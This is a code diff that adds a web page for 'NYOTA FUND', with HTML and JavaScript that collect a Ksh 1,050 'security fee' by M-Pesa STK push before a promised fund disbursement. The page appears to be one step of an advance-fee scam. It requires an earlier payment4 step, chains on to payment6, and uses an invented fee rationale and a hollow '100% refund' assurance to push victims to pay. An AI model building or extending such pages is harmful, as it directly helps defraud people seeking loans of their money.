@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NYOTA FUND – Security Fee</title>
+<link rel="stylesheet" href="style.css">
+<style>
+/* Spinner animation */
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2>NYOTA FUND Security Verification</h2>
+
+  <div class="notice">
+    <strong>Great news 🎉</strong><br><br>
+    Your <strong>NYOTA FUNDs</strong> is now <strong>ready for disbursement</strong>.
+    To secure and protect your funds during final delivery, a one-time 
+    <strong>security fee of Ksh 1,050</strong> is required.
+    <br><br>
+    This security fee ensures that:
+    <ul style="text-align:left; margin-top:10px;">
+      <li>✅ Your NYOTA FUNDs is protected from delivery errors</li>
+      <li>✅ Your transaction is officially verified and secured</li>
+      <li>✅ You are eligible for full customer support</li>
+    </ul>
+    <br>
+    <strong>Important assurance 🔐</strong><br>
+    In the unlikely event that you do not receive your NYOTA FUNDs,  
+    <strong>100% of the money you have paid will be refunded to you in full</strong>.
+    <br><br>
+    Thank you for trusting <strong>NYOTA FUND</strong>. You’re just one step away 🙌
+  </div>
+
+  <form id="payForm">
+    <input id="phone" type="tel" placeholder="07XXXXXXXX" required>
+    <button type="submit">Pay Ksh 1,050 Securely</button>
+  </form>
+</div>
+
+<!-- POPUP -->
+<div id="popupOverlay">
+  <div class="popupContent">
+    <h3 id="popupTitle"></h3>
+    <div id="popupSpinner"></div>
+    <p id="popupMessage"></p>
+    <button id="popupBtn">OK</button>
+  </div>
+</div>
+
+<script>
+
+/* =========================
+   ACCESS PROTECTION
+========================= */
+if (!localStorage.getItem("payment4Completed")) {
+  window.location.href = "payment4.html";
+}
+
+/* =========================
+   CONFIG
+========================= */
+const API_BASE = "https://optima-server-isaac.onrender.com";
+const SECURITY_FEE = 1050;
+
+/* =========================
+   ELEMENTS
+========================= */
+const phoneInput = document.getElementById("phone");
+
+const popupOverlay = document.getElementById("popupOverlay");
+const popupTitle = document.getElementById("popupTitle");
+const popupSpinner = document.getElementById("popupSpinner");
+const popupMessage = document.getElementById("popupMessage");
+const popupBtn = document.getElementById("popupBtn");
+
+/* =========================
+   LOAD PHONE
+========================= */
+const userPhone = localStorage.getItem("userPhone");
+
+if (userPhone) {
+  phoneInput.value = userPhone;
+  phoneInput.readOnly = true;
+}
+
+const fund =
+  JSON.parse(localStorage.getItem("selectedFund")) ||
+  { amount: 0 };
+
+/* =========================
+   POPUP
+========================= */
+function showPopup(
+  title,
+  message = "",
+  spin = false,
+  ok = false
+) {
+
+  popupTitle.innerText = title;
+
+  popupMessage.innerHTML = message;
+
+  popupSpinner.innerHTML = spin
+    ? `
+      <div style="
+      width:30px;
+      height:30px;
+      border:4px solid #eee;
+      border-top:4px solid #0a6ebd;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin:auto;">
+      </div>
+    `
+    : "";
+
+  popupBtn.style.display =
+    ok ? "block" : "none";
+
+  popupOverlay.style.display =
+    "block";
+}
+
+popupBtn.onclick = () => {
+  popupOverlay.style.display = "none";
+};
+
+/* =========================
+   PHONE NORMALIZATION
+========================= */
+function normalizePhone(input) {
+
+  const digits =
+    input.replace(/\D/g, "");
+
+  if (
+    digits.startsWith("07") ||
+    digits.startsWith("01")
+  ) {
+    return "254" + digits.slice(1);
+  }
+
+  if (
+    digits.startsWith("7") ||
+    digits.startsWith("1")
+  ) {
+    return "254" + digits;
+  }
+
+  if (digits.startsWith("254")) {
+    return digits;
+  }
+
+  return null;
+}
+
+/* =========================
+   SUBMIT PAYMENT
+========================= */
+document
+.getElementById("payForm")
+.addEventListener(
+  "submit",
+  async (e) => {
+
+    e.preventDefault();
+
+    const phone =
+      normalizePhone(
+        phoneInput.value.trim()
+      );
+
+    if (!phone) {
+
+      return showPopup(
+        "Invalid Phone ❌",
+        "Enter a valid Safaricom number.",
+        false,
+        true
+      );
+    }
+
+    showPopup(
+      "Processing...",
+      "Sending STK Push...",
+      true,
+      false
+    );
+
+    try {
+
+      const res =
+        await fetch(
+          `${API_BASE}/stk-push`,
+          {
+            method: "POST",
+            headers: {
+              "Content-Type":
+                "application/json"
+            },
+            body: JSON.stringify({
+              phone,
+              amount: SECURITY_FEE,
+              loan_amount:
+                fund.amount
+            })
+          }
+        );
+
+      const data =
+        await res.json();
+
+      const checkoutId =
+        data.checkout_request_id ||
+        data.CheckoutRequestID;
+
+      if (!checkoutId) {
+        throw new Error(
+          "Missing checkout ID"
+        );
+      }
+
+      localStorage.setItem(
+        "payment5_checkout_id",
+        checkoutId
+      );
+
+      showPopup(
+        "STK Sent 📲",
+        "Enter your M-Pesa PIN.",
+        true,
+        false
+      );
+
+      pollPayment(checkoutId);
+
+    } catch (err) {
+
+      console.error(err);
+
+      showPopup(
+        "Payment Failed ❌",
+        "Unable to send STK Push.",
+        false,
+        true
+      );
+    }
+});
+
+/* =========================
+   POLLING
+========================= */
+function pollPayment(
+  checkoutId
+) {
+
+  let attempts = 0;
+
+  const interval =
+    setInterval(
+      async () => {
+
+        attempts++;
+
+        if (
+          attempts > 60
+        ) {
+
+          clearInterval(
+            interval
+          );
+
+          return showPopup(
+            "Still Processing ⏳",
+            "Please wait a little longer.",
+            false,
+            true
+          );
+        }
+
+        try {
+
+          const res =
+            await fetch(
+              `${API_BASE}/check-status`,
+              {
+                method:
+                  "POST",
+                headers: {
+                  "Content-Type":
+                    "application/json"
+                },
+                body:
+                  JSON.stringify({
+                    checkout_request_id:
+                      checkoutId
+                  })
+              }
+            );
+
+          const data =
+            await res.json();
+
+          const status =
+            data.status?.toLowerCase();
+
+          if (
+            status ===
+            "pending"
+          ) {
+            return;
+          }
+
+          clearInterval(
+            interval
+          );
+
+          if (
+            status ===
+            "completed"
+          ) {
+
+            localStorage.removeItem(
+              "payment5_checkout_id"
+            );
+
+            localStorage.setItem(
+              "payment5Completed",
+              "yes"
+            );
+
+            showPopup(
+              "Payment Confirmed ✅",
+              `
+              Security fee received successfully.<br><br>
+              Transaction Code:<br>
+              <strong>
+              ${
+                data.transaction_code ||
+                "Confirmed"
+              }
+              </strong><br><br>
+              Redirecting...
+              `,
+              false,
+              false
+            );
+
+            setTimeout(
+              () => {
+
+                window.location.replace(
+                  "payment6.html"
+                );
+
+              },
+              2500
+            );
+
+          } else {
+
+            localStorage.removeItem(
+              "payment5_checkout_id"
+            );
+
+            showPopup(
+              "Payment Failed ❌",
+              data.message ||
+              "Payment not completed.",
+              false,
+              true
+            );
+          }
+
+        } catch (err) {
+
+          console.log(
+            "Polling error:",
+            err
+          );
+        }
+
+      },
+      2000
+    );
+}
+
+/* =========================
+   RESUME POLLING
+========================= */
+const savedCheckoutId =
+  localStorage.getItem(
+    "payment5_checkout_id"
+  );
+
+if (savedCheckoutId) {
+
+  showPopup(
+    "Resuming Payment...",
+    "Checking payment status.",
+    true,
+    false
+  );
+
+  pollPayment(
+    savedCheckoutId
+  );
+}
+
+</script>
+
+</body>
+</html>
